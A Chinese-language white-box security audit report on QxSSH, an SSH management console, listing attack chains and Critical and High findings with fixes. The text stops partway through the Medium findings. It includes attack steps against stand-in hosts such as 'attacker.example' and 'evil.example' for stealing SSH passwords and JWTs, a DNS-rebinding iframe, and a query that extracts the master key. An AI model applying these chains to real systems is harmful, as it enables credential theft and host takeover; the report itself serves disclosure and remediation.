# QxSSH 安全审计报告

- **审计日期**：2026-11-19
- **审计对象**：QxSSH（自托管 SSH 管理控制台），Go 后端约 16,900 行 + 前端 JS/HTML 约 30,000 行（不含 vendor）
- **审计方式**：白盒静态审计。6 个并行专项（认证与会话 / 凭据与加密存储 / 命令执行与终端 / 文件与网络转发 / 应用商店与审计日志 / 前端与沙箱桥接）全文通读范围内源码，跨文件求证；汇总人对全部 Critical/High 级关键发现逐条复核代码证据。未运行 `qxssh.exe`，未做动态 PoC 验证，未修改任何源码。
- **辅助检查**：`go vet ./...` 通过（0 告警）；依赖版本核对（见 QX-079）；仓库卫生检查（无二进制入库、文档/示例无真实凭据）。
- **专项明细报告**（含完整代码证据、攻击链推导、修复建议、"已检查无问题"清单）：
  [findings-auth.md](<audit-work/findings-auth.md>) · [findings-creds.md](<audit-work/findings-creds.md>) · [findings-exec.md](<audit-work/findings-exec.md>) · [findings-net.md](<audit-work/findings-net.md>) · [findings-apps.md](<audit-work/findings-apps.md>) · [findings-frontend.md](<audit-work/findings-frontend.md>)

---

## 一、执行摘要

本次审计共确认 **80 项去重后的发现**（原始 107 项，跨专项重复合并）：

| 严重级别 | 数量 | 编号范围 |
|---|---|---|
| **Critical** | 3 | QX-001 ~ QX-003 |
| **High** | 17 | QX-004 ~ QX-020 |
| **Medium** | 29 | QX-021 ~ QX-049 |
| **Low** | 24 | QX-050 ~ QX-073 |
| **Info** | 7 | QX-074 ~ QX-080 |

**总体评价**：项目的安全基础功扎实——JWT 实现无算法混淆、零默认权限、SQL 全参数化、crypto/rand 全覆盖、无 `InsecureIgnoreHostKey`、shellQuote 转义正确、刷新令牌轮换+重放检测、secret 按应用严格隔离。但存在一条贯穿性的结构弱点：

> **宿主全量令牌（hostTok）与全量权限 JWT 的"投放、记录、保护"面失守，叠加应用安装链与权限门禁的多处缺口，使低权限应用、恶意网页、甚至一次点击都可能升级为宿主完全接管。**

三条 Critical 链（恶意应用包任意目录读、Danger-1 权限窃取全部 SSH 密码、桥接令牌外带）均可在代码层面闭环推导，建议立即修复。

### 威胁模型

| 编号 | 攻击者 | 场景 |
|---|---|---|
| T1 | 恶意/被攻陷的已安装应用 | 沙箱 iframe 内运行，持有用户授予的部分权限 JWT |
| T2 | 诱导用户安装恶意应用包的攻击者 | 商店/URL/git 安装链（供应链） |
| T3 | 受害者浏览器访问的恶意网页 | 默认回环免鉴权部署下的 CSRF / DNS rebinding / 跨源读取 |
| T4 | 本地低权限进程 / 备份与云同步链路 | 读取配置目录（data.db、keys/、审计文件） |
| T5 | 网络路径上的主动 MITM | SSH 主机键信任模型与算法协商 |
| T6 | 远程部署下的未认证攻击者 | 配置了 `-auth-token` 的公网/内网暴露面 |

---

## 二、端到端攻击链（Top 8）

以下链条均由已确认的代码缺陷串联而成，标注前置条件。

### 链 A：恶意应用包 → 宿主完全接管（T2，Critical）
`QX-001 → QX-015 → QX-004 → QX-007`
1. 攻击者构造 `.qxp` zip，内含 `.qx-source` 文件，内容为配置目录绝对路径（默认路径可预测：`%AppData%/qxssh` 或 `~/.config/qxssh`）。`parseAppZip` 不拒点文件，原样解压。
2. `appRoot` 读到标记后把该应用的文件根**劫持到配置目录**。
3. `GET /api/v1/apps/file/<id>/keys/private.pem` 与 `.../data.db` —— 该路由注册在鉴权分派之外，**零会话要求**，直接下载 IdP 签名私钥与凭据库（主密钥明文同库）。
4. 用私钥自签 `sub="__host__"`、任意 scope 的 JWT（宿主身份跳过 epoch/主体校验）→ 全量 API：所有主机凭据、任意命令执行、宿主文件系统读写。**禁用/卸载应用前的窗口期即可完成后门持久化（自签 JWT 不依赖应用存活）。**

### 链 B：两个"无害"权限 → 全部 SSH 明文密码（T1，Critical）
`QX-002 + QX-021`
1. 用户授予某应用 `hosts:read`（Danger 1）+ `hosts:test`（Danger 1，界面描述仅为"连通性测试"）。
2. 应用对每台主机调用 `POST hosts/test {id, address:"attacker.example", port:2222}`。
3. 服务端取出**已解密**的保存凭据，向覆盖后的地址拨号；SSH 密码认证把明文密码送到攻击者服务器。新地址主机键走静默 TOFU，无任何告警。
4. 全程绕过 Danger-3 的 `hosts:credential`，无需再次用户交互。附带：`KeyPath` 覆盖可把宿主 `~/.ssh/id_rsa` 等任意本地私钥用于对攻击者认证，并经错误差异探测任意文件存在性。

### 链 C：内置应用一行代码 → 宿主接管（T1/T2，Critical）
`QX-003 + QX-019 + QX-045`
1. 任一内置应用出现 XSS（已确认的动态 innerHTML 流：browser 应用标签取自本机浏览器注册表/版本元数据）或被供应链更新植入恶意代码（QX-011 覆盖安装不吊销）。
2. 恶意代码执行 `location.href='https://evil.example/'`——沙箱**不阻止帧自导航**。
3. iframe `load` 事件触发宿主 `sendInit`，以 `targetOrigin:'*'` 把该应用的会话 JWT 推给帧内"当前文档"——现在是攻击者站点。
4. 内置应用 JWT 为**全量权限**（`appScope` 对 systemApp 返回 `permIDs()`）→ 攻击者直接持有宿主等价令牌：`secret/get`、`perm/grant`、任意主机 exec、`localfs/*`。

### 链 D：恶意网页 → 默认部署接管（T3，High，部分浏览器 Critical）
`QX-005（=LEAD 独立验证）`
1. 受害者访问 evil.com；DNS rebinding 把 evil.com 解析切到 127.0.0.1。
2. 攻击页嵌入 `<iframe src="http://evil.com:8800/">`：iframe 导航携带 `Sec-Fetch-Mode: navigate` → 服务端把 hostTok 注入 `<meta name="qx-session">`。网关**无 Host 白名单**；`X-Frame-Options: SAMEORIGIN` 在 rebinding 后顶层与帧同源（都是 evil.com）→ 放行。
3. 攻击页同源读取 `iframe.contentDocument` 取出 hostTok（全量、不过期、不可吊销）。
4. 以 `X-Qx-Session` 头调用全部 API。**限定条件**：现代 Chrome 的 Private Network Access 预检可能拦截公网→回环请求；Firefox/Safari 及旧版浏览器无此防护。代码缺陷已确认，实际可行性依浏览器而定。

### 链 E：日志读取权限 → 宿主接管（T1，High）
`QX-006（=LEAD 独立验证）`
1. 管理员开启 verbose 详细审计排障（或应用持 `logs:verbose` 自行开启）。
2. 宿主页面每次 API 调用的 `X-Qx-Session: <hostTok>` 头被**原样**写入审计条目（实时路径仅对 query 脱敏；`sanitizeVerbose` 只在归档时调用）。
3. 持 `logs:read` + `logs:readSensitive` 的应用调 `logs/list` 读出 hostTok——**不过期、不轮换、无法吊销** → 永久宿主接管，超出其授权范围。

### 链 F：调度权限 → 绕过执行权限（T1，High）
`QX-009`
应用仅持 `schedule:create` + `schedule:run`：创建含任意 argv 的调度（创建时不查执行权限），再手动触发 `schedule/run`——该 handler 直接 `startJob`，**不像 cron 路径 `fireSchedule` 那样复核 `execPermNeed`** → 在任意主机执行任意命令，绕过 `exec:run`。

### 链 G：exec:run 搭车 sudo → 远端 root（T1，High）
`QX-008`
宿主或另一应用曾通过 `sudo/request` 缓存某主机的 sudo 密码（按 hostID 全局共享，30 分钟 TTL）。仅持 `exec:run` 的应用对该主机发 `elevated=true` 执行——**无任何提权权限门禁**，直接复用缓存密码拿远端 root；SFTP `elevated=1` 同理（`server:read` Danger-1 变 root 读）。

### 链 H：remote 隧道 → 暴露宿主回环端口（T1/T6，High）
`QX-017`
持 `tunnel:start` 的应用创建 remote 隧道，把宿主 `127.0.0.1:8800` 转发到远端 `0.0.0.0`（remote 类型不受 loopback-only 限制；对外可达需远端 sshd `GatewayPorts`）。攻击者对暴露端口用 raw TCP 发 `GET /` + 伪造 `Sec-Fetch-Mode: navigate` 头（非浏览器客户端可任意设置）→ 直接取得注入的 hostTok，无需浏览器、无需 rebinding。

---

## 三、Critical 级发现（3 项）

### QX-001 应用 zip 可夹带 `.qx-source`，劫持应用文件根至宿主任意目录并经无鉴权端点读取
- **级别**：Critical ｜ **CWE**：CWE-22 / CWE-862 ｜ **置信度**：已确认（lead 复核全链）
- **来源**：NET-01 = APP-01（两专项独立发现，互相印证）
- **位置**：[apps.go:652-662](<internal/httpapi/apps.go#L652>)（parseAppZip 只拦绝对路径/`..`/空名，不滤点文件）、[apps.go:812-843](<internal/httpapi/apps.go#L812>)（installAppZip 原样解压）、[appdev.go:15-29](<internal/httpapi/appdev.go#L15>)（appRoot 读标记即重定向，无目录白名单）、[api.go:154](<internal/httpapi/api.go#L154>)（apps/file 注册在 sysDispatch 之外）、[apps.go:1000-1039](<internal/httpapi/apps.go#L1000>)（前缀校验基于被劫持的根；不查应用启用状态）
- **描述**：见攻击链 A。zip 安装路径不拒绝 `.qx-source`；git 安装路径会跳过 `.qx-` 前缀文件（[appgit.go:324](<internal/httpapi/appgit.go#L324>)），故本链仅 zip 路径可行。配置目录绝对路径可预测，或经 `local:hostinfo`/错误信息泄露获得。
- **影响**：未认证读取 IdP 私钥 + data.db（主密钥与全部凭据同库）→ 自签宿主 JWT 完全接管；禁用应用不止血。
- **修复**：
  1. `.qx-source`（及一切 `.qx-*`）列为安装包保留名，parseAppZip 直接拒包；
  2. appRoot 的标记重定向仅允许开发模式显式开启，且目标目录白名单/用户确认；
  3. apps/file 纳入会话鉴权（至少校验应用身份或宿主会话），并检查应用启用状态；
  4. 纵深：配置目录文件名（data.db、keys/）加入服务黑名单。

### QX-002 hosts/test（Danger 1）允许覆盖已存主机地址/KeyPath，用已解密凭据向攻击者服务器认证
- **级别**：Critical ｜ **CWE**：CWE-863 / CWE-200 ｜ **置信度**：已确认（lead 复核）
- **来源**：CRED-02 = EXEC-03（两专项独立发现）
- **位置**：[hosts.go:94-163](<internal/httpapi/hosts.go#L94>)（字段覆盖 + DialOnce）、[api.go:173](<internal/httpapi/api.go#L173>)（注册为 hosts:test）、[permissions.go:136](<internal/httpapi/permissions.go#L136>)（Danger 1）、[pool.go:108-110](<internal/sshpool/pool.go#L108>)（ssh.Password）、[pool.go:113-118](<internal/sshpool/pool.go#L113>)（KeyPath → os.ReadFile 任意路径）
- **描述**：见攻击链 B。`req.ID` 命中已存主机时先取出已解密凭据，再允许请求体覆盖 Address/Port/User/AuthType/KeyPath/JumpHostID。SSH 密码认证明文到服务端为协议事实；新目标主机键静默 TOFU（QX-021）不报警。次生面：KeyPath 覆盖可读取/使用宿主任意私钥文件并经错误差异（`read key: open …` vs `parse key: …`）探测文件存在性，绕过 Danger-3 的 `local:read`；不带 ID 时可向任意内网地址发起带凭据 SSH 拨号（SSRF/内网扫描，错误与延迟回显）。
- **修复**：测试已存主机时禁止覆盖 Address/Port/User/KeyPath（凭据只用于原目标）；"新凭据试连"走独立的未保存主机流程；覆盖地址需用户显式确认；上调 hosts:test 危险级别与描述。

### QX-003 宿主在 iframe 每次 load 时以 `targetOrigin:'*'` 推送应用 JWT，帧自导航即可外带令牌
- **级别**：Critical ｜ **CWE**：CWE-345 / CWE-201 ｜ **置信度**：已确认（lead 复核）
- **来源**：FE-01（FE-02 为其放大器，见 QX-019）
- **位置**：[appframe.js:77-85](<internal/webui/assets/js/wm/appframe.js#L77>)（post 恒用 `'*'`，注释自述安全依赖接收端校验）、[appframe.js:848-872](<internal/webui/assets/js/wm/appframe.js#L848>)（sendInit 携带 session）、[appframe.js:1394-1400](<internal/webui/assets/js/wm/appframe.js#L1394>)（`load` 事件无条件 sendInit）、[idp.go:551-553](<internal/httpapi/idp.go#L551>)（systemApp 全量 scope）
- **描述**：见攻击链 C。sandbox（无 allow-same-origin）不阻止帧内文档自导航；导航到外部站点后 load 事件照常触发，宿主把含 JWT 的 init 消息广播给帧内当前文档。接收端 `e.source === window.parent` 校验只保护"应用收宿主消息"方向，保护不了"宿主把令牌发给谁"。内置应用 JWT 全量权限，任何内置应用 XSS/恶意更新一行代码即外带宿主等价令牌；第三方应用 JWT 外带则导致该应用身份被冒充。
- **修复**：
  1. 改为**应用主动握手**：帧就绪后经桥发 `init-request`，宿主校验 `e.source` 后仅对该帧回复令牌（load 事件不再无条件推送）；
  2. 或 init 不含令牌，令牌经宿主代理的 API 调用间接使用（应用永远不持有原始 JWT）；
  3. 内置应用 JWT 降为实际所需 scope（见 QX-019）；
  4. 导航离开应用入口 URL 后销毁会话（宿主可经桥心跳/ready 超时检测）。

---

## 四、High 级发现（17 项）

### QX-004 主密钥明文存于同一 SQLite 库，静态加密实质是混淆
- **CWE**：CWE-321 / CWE-312 ｜ **置信度**：已确认（lead 复核）｜ **来源**：CRED-01（专项定级 Critical，汇总调整为 High：独立利用需本地文件读权限；作为链 A 放大器时按链定级）
- **位置**：[db.go:216-230](<internal/config/db.go#L216>)（resolveMasterKey 明文写回 meta 表）、[config.go:103-112](<internal/config/config.go#L103>)
- **描述**：凭据用 AES-256-GCM + 随机 nonce 加密（算法本身合理），但 32 字节主密钥明文存于同一个 data.db 的 `meta.master_key`，无口令派生、无 OS 密钥链、无轮换。读到 data.db 一个文件（同用户恶意进程、备份/云同步外流、宽松目录权限下的其他用户）即可 `SELECT value FROM meta WHERE key='master_key'` 解密全部主机凭据、应用机密与 verbose 审计信封。WAL 文件同样可能携带密钥页。
- **修复**：主密钥接入 OS 密钥链（DPAPI/Keychain/libsecret）或用户主口令 Argon2id 派生 KEK 包裹；至少移出 data.db 独立 0600 文件；增加轮换与重加密；密文绑定 AAD（host ID/字段名）防跨主机搬移。

### QX-005 网关无 Host 校验 + 回环免鉴权 + navigate 注入 hostTok → DNS rebinding 全量接管
- **CWE**：CWE-350 / CWE-346 ｜ **置信度**：代码缺陷已确认（lead 独立验证）；浏览器端可利用性疑似（PNA/DNS 缓存影响，需实测）｜ **来源**：AUTH-01 = NET-03 = APP-13 = LEAD-01（三方独立印证）
- **位置**：[api.go:289-309](<internal/httpapi/api.go#L289>)（注入条件仅 GET+Sec-Fetch-Mode）、[api.go:339-358](<internal/httpapi/api.go#L339>)（CORS 回显任意 Origin）、[sys.go:545-559](<internal/httpapi/sys.go#L545>)（injectSession）、全仓库无 Host 白名单（grep 证实）
- **描述**：见攻击链 D。rebinding 后攻击页与目标同源，XFO SAMEORIGIN / CORS / Sec-Fetch 三道防线同时失效。hostTok 全量、不过期、不可吊销。
- **修复**：增加 Host 头白名单中间件（仅允许 127.0.0.1/localhost/[::1]/配置的主机名，拒绝其他 Host）；injectSession 额外校验 Sec-Fetch-Dest=document 且 Host 可信；更彻底的方案是宿主页面不直接注入长效令牌，改为一次性 code 交换短时令牌。

### QX-006 实时 verbose 审计原样记录认证头，logs:readSensitive 应用可窃取 hostTok/部署令牌
- **CWE**：CWE-532 / CWE-200 ｜ **置信度**：已确认（lead 独立验证）｜ **来源**：AUTH-02 = LEAD-02
- **位置**：[sys.go:200-204](<internal/httpapi/sys.go#L200>)（newAuditCapture 复制全部请求头）、[sys.go:254](<internal/httpapi/sys.go#L254>)（仅 query 脱敏）、[auditarchive.go:121,175-206](<internal/httpapi/auditarchive.go#L121>)（sanitizeVerbose 仅归档路径调用）、[audit.go:336-342](<internal/httpapi/audit.go#L336>)（sensitive 权限即可读在线明细）
- **描述**：见攻击链 E。verbose 开启时宿主每次 API 调用的 `X-Qx-Session`（即 hostTok 本身）、`Authorization: Bearer <部署令牌>`、`Cookie: qx_token` 原样入审计。条目虽用主密钥加密落盘，但主密钥同库明文（QX-004），且在线 logs/list 对持 `logs:readSensitive`（Danger 3，描述警告"含凭据明文"）的应用直接解密返回。hostTok 不过期、不轮换、无法吊销 → 一次读取 = 永久接管。
- **修复**：实时捕获阶段即对 X-Qx-Session/Authorization/Cookie 统一脱敏（复用 sanitizeVerbose 的敏感名正则）；hostTok 改为可轮换/可吊销、有有效期；logs:readSensitive 的授权 UI 明确警示"等价宿主接管"。

### QX-007 IdP 签名私钥明文落盘；轮换归档保留私钥且旧 kid 永久可验签
- **CWE**：CWE-312 / CWE-324 ｜ **置信度**：已确认（lead 复核）｜ **来源**：CRED-07 = AUTH-03
- **位置**：[idp.go:300-338](<internal/httpapi/idp.go#L300>)（PKCS8 明文 PEM 0600）、[idp.go:112-138](<internal/httpapi/idp.go#L112>)（rotate 把旧私钥改名归档）、[idp.go:268-298](<internal/httpapi/idp.go#L268>)（loadArchivedPublicKeys 解析归档私钥并永久加入验签集合）、[idp.go:514-531](<internal/httpapi/idp.go#L514>)（hostApp 跳过主体/epoch 校验）
- **描述**：读到 keys/private.pem 或 keys/archive/private-*.pem 任一文件者可离线自签 `sub="__host__"`、任意 scope、任意 exp 的 JWT 通过全部校验，跨重启持久有效。密钥轮换不具备"泄露后止血"能力（旧私钥永久保留、旧 kid 永久受信）。本地文件读权限即可（T4），或经链 A/QX-036 远程获得。
- **修复**：归档只保留公钥（验签只需公钥），旧私钥安全删除；旧 kid 设验签宽限期（≥accessTTL 30 分钟）后移除；私钥用 OS 密钥链或口令包裹；Windows 补 ACL。

### QX-008 elevated 执行无提权权限门禁，sudo 缓存按 hostID 全局共享、跨应用搭车
- **CWE**：CWE-863 / CWE-522 ｜ **置信度**：已确认（lead 复核）｜ **来源**：EXEC-01 = AUTH-04 = NET-08（三方印证）
- **位置**：[exec.go:228-261](<internal/httpapi/exec.go#L228>)（req.Elevated 直通，无额外权限检查；sudoPrefix 取全局缓存）、[sudoauth.go:20-41](<internal/httpapi/sudoauth.go#L20>)（缓存仅按 hostID 键控）、[sftp.go:419-447](<internal/httpapi/sftp.go#L419>)（SFTP elevated 复用缓存/NOPASSWD，不查 sudo:request）
- **描述**：见攻击链 G。仅持 exec:run 的应用可借宿主/其他应用缓存的 sudo 密码拿远端 root；server:read（Danger 1）+ elevated=1 变远端 root 读。local:exec 还可对宿主本机试 `sudo -n`。
- **修复**：elevated 执行要求独立的提权权限节点（Danger 3）或逐次用户确认；sudo 缓存按 (hostID, appID) 隔离；SFTP elevated 同样门禁。

### QX-009 schedule/run 不复核执行权限，与 cron 路径不一致 → 绕过 exec:run
- **CWE**：CWE-863 ｜ **置信度**：已确认（lead 复核）｜ **来源**：EXEC-02
- **位置**：[schedule.go:357-382](<internal/httpapi/schedule.go#L357>)（handleScheduleRun 直接 startJob）、对照 [schedule.go:177-183](<internal/httpapi/schedule.go#L177>)（fireSchedule 复核 permAllowed）、[schedule.go:236-263](<internal/httpapi/schedule.go#L236>)（创建时亦不查执行权限）
- **描述**：见攻击链 F。仅 schedule:create+run 的应用可在任意主机执行任意 argv。
- **修复**：handleScheduleRun 与 handleScheduleCreate 均复核 `execPermNeed(sc.Host)`，与 fireSchedule 对齐。

### QX-010 安装即预授权：manifest 声明的权限（含 Danger 3）自动授予，无逐项用户同意
- **CWE**：CWE-863 / CWE-269 ｜ **置信度**：已确认（lead 复核）｜ **来源**：APP-02 = NET-09
- **位置**：[apps.go:510-522](<internal/httpapi/apps.go#L510>)（installAndGrantZip 直接 Grant）、[apps.go:463-475](<internal/httpapi/apps.go#L463>)（git 路径同样）
- **描述**：安装应用时 manifest.permissions 无上限、无服务端确认即全部落库。结合 QX-028（perm:grant 自我授权）与 QX-008/009，`apps:install` 单权限可直达宿主 RCE：安装一个声明 local:exec 的包即可。前端 validate 确认页不构成安全边界（可绕过 UI 直接调 API）。
- **修复**：安装时服务端强制展示权限清单并要求宿主会话显式确认（Danger≥2 逐项）；manifest 权限声明设上限；安装与授权解耦（先装后授）。

### QX-011 覆盖安装/重新 link 不吊销目标应用令牌、旧授权只增不减 → 木马可继承受害应用身份
- **CWE**：CWE-281 / CWE-863 ｜ **置信度**：已确认（lead 复核）｜ **来源**：APP-03
- **位置**：[apps.go:806-807](<internal/httpapi/apps.go#L806>)（RemoveAll 后按同 ID 重装）、[apps.go:503-525](<internal/httpapi/apps.go#L503>)（只 Grant 不 Revoke/不 invalidateAppTokens）、[appdev.go:131](<internal/httpapi/appdev.go#L131>)（link 同）
- **描述**：恶意"更新包"使用受害应用相同 ID 覆盖安装后，继承其全部已授权限与仍然有效的 refresh/access 令牌（epoch 未变）。供应链攻击的权限放大器。
- **修复**：覆盖安装视为新应用：吊销全部令牌（invalidateAppTokens）、清空旧授权、按新 manifest 重新走同意流程；或校验包签名/来源一致性。

### QX-012 git 安装 copyFile 跟随文件符号链接，把宿主敏感文件搬进可公开访问的应用目录
- **CWE**：CWE-59 / CWE-200 ｜ **置信度**：Linux 已确认，Windows 疑似 ｜ **来源**：APP-04
- **位置**：[appgit.go:341-358](<internal/httpapi/appgit.go#L341>)（os.Open 跟随符号链接）、[appgit.go:317-335](<internal/httpapi/appgit.go#L317>)（WalkDir 文件符号链接按普通文件处理）
- **描述**：恶意 git 仓库放一个名为 `notes.txt` 的符号链接指向 `~/.config/qxssh/data.db` 或 `/etc/shadow`，安装时内容被复制进 apps/<id>/，再经无鉴权 apps/file 端点（QX-015）公开下载。与链 A 后果相当（Linux 部署）。注意 git 路径跳过 `.qx-` 前缀（appgit.go:324），故 .qx-source 劫持不走此路径。
- **修复**：复制前 lstat 拒绝符号链接（或 O_NOFOLLOW 打开）；go-git checkout 禁用符号链接材质化；应用目录服务黑名单（同 QX-001）。

### QX-013 应用 HTML/SVG 与宿主同源 serving 且全网关无 CSP → 顶层导航脱离沙箱读取 hostTok
- **CWE**：CWE-1021 / CWE-693 ｜ **置信度**：机制已确认（lead 复核 serving 路径）；利用需诱导点击 ｜ **来源**：APP-05
- **位置**：[apps.go:1031-1039](<internal/httpapi/apps.go#L1031>)（.html→text/html、.svg→image/svg+xml 同源服务）、[api.go:458-466](<internal/httpapi/api.go#L458>)（无 CSP/frame-ancestors）、[api.go:289-309](<internal/httpapi/api.go#L289>)（宿主页 navigate 注入）
- **描述**：应用入口在沙箱 iframe 内是安全的，但诱导用户顶层导航到 `http://127.0.0.1:8800/api/v1/apps/file/<id>/index.html`（或含脚本的 SVG）后，文档以**宿主同源、无沙箱**运行：可 iframe /desktop.html（XFO SAMEORIGIN 放行）读取注入的 hostTok，或直接调全量 API。一次点击 = 完全接管。
- **修复**：应用文件改用独立不透明源服务（沙箱 iframe 专用路径 + `Content-Disposition`/独立端口/`Cross-Origin-Resource-Policy`）；对 HTML/SVG 响应强制 `Content-Security-Policy: sandbox`；全网关部署 CSP（见 QX-056）。

### QX-014 应用包下载允许 http、无校验和/签名、跟随重定向、目标任意 → 供应链 MITM + SSRF
- **CWE**：CWE-494 / CWE-918 ｜ **置信度**：已确认 ｜ **来源**：APP-06
- **位置**：[apps.go:398 附近](<internal/httpapi/apps.go#L398>)（downloadAppZip）
- **描述**：`apps/install {url}` 接受任意 http(s) URL，无完整性校验，跟随重定向。网络 MITM 可替换包内容（结合 QX-010/011 直接提权）；URL 可指向内网/云元数据（SSRF，响应差异回显）。
- **修复**：强制 https + 校验和/签名验证；重定向上限与目标地址策略（禁内网/回环，见 QX-035）；商店索引固定可信源。

### QX-015 apps/file 端点零鉴权 + CORS 回显任意 Origin → 任意网站/跨应用读取应用文件
- **CWE**：CWE-862 / CWE-346 ｜ **置信度**：已确认（lead 复核）｜ **来源**：NET-02 = AUTH-17 = APP-07 = APP-20
- **位置**：[api.go:154](<internal/httpapi/api.go#L154>)（sysDispatch 之外）、[api.go:316-328](<internal/httpapi/api.go#L316>)（/api/ 全量 CORS 回显）、[apps.go:1031-1034](<internal/httpapi/apps.go#L1031>)（注释称扩展名白名单，实际未知扩展回退 octet-stream 照发）
- **描述**：默认回环部署下，任意网站可跨源 fetch 读取任意已安装应用的全部文件（应用私有数据、源码、配置）；审计 AppID 取自 URL 可未认证伪造归属/洪泛。本端点同时是链 A/QX-012 的外带通道。`..`/双重编码防护本身做得对（前缀校验有效），问题在鉴权缺失与根劫持。
- **修复**：纳入会话鉴权；CORS 收敛为可信 Origin 列表；未知扩展名拒绝而非 octet-stream；审计记录真实调用者。

### QX-016 webproxy 本地监听零鉴权、无 Host 校验、剥离 XFO/CSP、跨上游 Cookie 串扰
- **CWE**：CWE-306 / CWE-346 / CWE-693 ｜ **置信度**：已确认 ｜ **来源**：NET-04
- **位置**：[proxy.go:296-302](<internal/proxy/proxy.go#L296>)（本地监听无鉴权）、[proxy.go:516-519](<internal/proxy/proxy.go#L516>)（剥 XFO/CSP）、[proxy.go:660-684](<internal/proxy/proxy.go#L660>)（Set-Cookie 去 Domain/Secure）、[proxy.go:475-482](<internal/proxy/proxy.go#L475>)（Host 改写）
- **描述**：webproxy 启动后本地端口无任何鉴权：同机进程/浏览器任意页面（经 rebinding）可借它读内网响应；上游站点被剥掉 XFO/CSP 后可被任意站 iframe（点击劫持）；不同上游的 Cookie 被去掉 Domain/Secure 后在同一代理源下互相覆盖/串扰（会话固定/混淆）。
- **修复**：代理监听加会话令牌门禁 + Host 校验；保留上游安全头（按代理源重写而非剥离）；Cookie 按上游隔离命名空间。

### QX-017 remote 隧道 bind/target 不受限 → 把宿主回环服务暴露到远端任意接口
- **CWE**：CWE-668 / CWE-284 ｜ **置信度**：已确认（对外可达需远端 sshd GatewayPorts）｜ **来源**：NET-05
- **位置**：[tunnel.go:192-206](<internal/tunnel/tunnel.go#L192>)、[tunnel.go:230-231](<internal/tunnel/tunnel.go#L230>)、[tunnel.go:324](<internal/tunnel/tunnel.go#L324>)（loopback-only 限制只覆盖 local/dynamic）
- **描述**：见攻击链 H。持 tunnel:start 的应用可把宿主 127.0.0.1:8800（免鉴权网关）转发到远端 0.0.0.0；raw TCP 伪造 Sec-Fetch-Mode 直接套取 hostTok。也可把远端内网服务反向暴露。
- **修复**：remote 隧道的 bind/target 同样施加地址策略（默认仅回环，暴露非回环需宿主显式确认）；禁止以宿主网关自身端口为 target；injectSession 加固（QX-005）后此链降级。

### QX-018 桥 api-return 缺 call.to 校验 + reqId 可预测 → 跨应用 API 响应伪造
- **CWE**：CWE-345 / CWE-290 ｜ **置信度**：已确认（lead 复核）｜ **来源**：FE-03
- **位置**：[appframe.js:698-719](<internal/webui/assets/js/wm/appframe.js#L698>)（api-return 无 `call.to !== entry` 检查），对照 [appframe.js:720-726](<internal/webui/assets/js/wm/appframe.js#L720>)（api-progress 有检查）
- **描述**：恶意应用帧可伪造其他应用发起的跨应用 API 调用的返回结果（reqId 格式 `rpc-时间戳-自增seq` 可预测/可观察）。实证链：伪造 tunnels.create 返回攻击者控制的 SOCKS 代理 → browser 应用把用户系统浏览器流量送入攻击者代理（MITM）。也可伪造权限请求结果、文件内容等。
- **修复**：api-return 补 `call.to === entry` 校验（与 api-progress/cancel 对齐）；reqId 改用 crypto 随机。

### QX-019 内置应用 JWT 全量 scope + 桥对 system 应用免除一切权限检查
- **CWE**：CWE-269 / CWE-863 ｜ **置信度**：已确认（lead 复核）｜ **来源**：FE-02
- **位置**：[idp.go:551-553](<internal/httpapi/idp.go#L551>)（appScope 对 systemApp 返回 permIDs()）、[appframe.js:320,1096,1205](<internal/webui/assets/js/wm/appframe.js#L320>)（system 应用免权限检查）、[sys.go:291-299](<internal/httpapi/sys.go#L291>)（permAllowed 对 systemAppIDs 恒真）
- **描述**：内置应用（terminal/files/browser/store/settings/logs/systemd）任一 XSS 等价宿主接管（放大 QX-003/QX-045）；全站无 CSP 兜底。内置应用被供应链更新（QX-011）或本地文件篡改（QX-036 local:write）后即成宿主后门。
- **修复**：内置应用按实际所需最小 scope 签发；桥权限检查对 system 应用同样生效（至少 Danger 3 操作）；部署 CSP。

### QX-020 known_hosts 按「地址+算法」分键信任，更换主机键算法即绕过变更拒绝
- **CWE**：CWE-295 ｜ **置信度**：已确认 ｜ **来源**：CRED-03
- **位置**：[hostkeys.go:84-92](<internal/sshpool/hostkeys.go#L84>)（`hostKey := hostname + " " + algo`，未命中即 TOFU）、[hostkeys.go:96-102](<internal/sshpool/hostkeys.go#L96>)（变更拒绝仅同算法生效）
- **描述**：同一主机已记录 ed25519 键后，MITM 出示另一种算法主机键（ecdsa/ssh-rsa/ssh-dss，默认均被接受，见 QX-022）即被当作"首次见面"静默信任。OpenSSH known_hosts 语义是"同主机不同密钥即告警"，此处被削弱。跳板链场景下被入侵的跳板机即可对下游拨号做 MITM。
- **修复**：以主机地址为唯一信任键；已知主机出现任何不同公钥一律拒绝并告警；改用 x/crypto/ssh/knownhosts 或 skeema/knownhosts（已在间接依赖）标准语义。

---

## 五、Medium 级发现（29 项）

### 认证与授权

**QX-027 workspace.info 桥方法无权限门禁（confused deputy）** ｜ CWE-863 ｜ 已确认（lead 复核）｜ AUTH-05 = FE-10
[appframe.js:908](<internal/webui/assets/js/wm/appframe.js#L908>) 注册无 `requirePermission`（对照 notify/settings.open 均有），[appframe.js:187-205](<internal/webui/assets/js/wm/appframe.js#L187>) 用宿主会话调 listHosts 并把全部主机 id/name/group/address/port/user/jumpHostId 返回给任意应用帧。零权限应用绕过 hosts:read 枚举全部受管主机。同页 `apps.reload`、`clipboard.write` 亦无门禁。修复：补权限检查（hosts:read），宿主数据按调用者权限过滤。

**QX-028 perm:grant 可自我授予任意权限（万能钥匙）** ｜ CWE-269 ｜ 已确认（lead 复核）｜ AUTH-07
[sys.go:438-480](<internal/httpapi/sys.go#L438>)：req.App 来自请求体且无目标限制，持 perm:grant 的应用可给自己授予全部权限（含 Danger 3），并经桥 perm-changed 触发宿主即时重签 JWT。修复：perm:grant/revoke/clear 仅限宿主会话使用，或每次授予需用户确认。

**QX-029 refresh 轮换检查-then-动作非原子** ｜ CWE-362 ｜ 已确认 ｜ AUTH-06
[idp.go:812-857](<internal/httpapi/idp.go#L812>) + [config.go:1296-1318](<internal/config/config.go#L1296>)：并发重用同一 refresh token 可绕过"重用即泄露→整体撤销"检测（两请求都先通过检查）。修复：轮换在单事务内以旧令牌行锁/条件更新完成，检查与作废原子化。

**QX-026 授权无按主机维度，grant/mint 的 host 参数仅审计用** ｜ CWE-269 ｜ 已确认 ｜ CRED-11 = NET-12
[hosts.go:239-279](<internal/httpapi/hosts.go#L239>)、[sys.go:438-480](<internal/httpapi/sys.go#L438>)、[config.go:924-940](<internal/config/config.go#L924>)：hosts:credential/exec:run/SFTP/net/tunnel 各 scope 一旦授予即覆盖**全部**主机，无法表达"只允许接触主机 A"。连接池跨应用复用同一已认证连接。修复：host 参数真正约束 scope 生效范围；凭据读取支持 per-host 白名单。

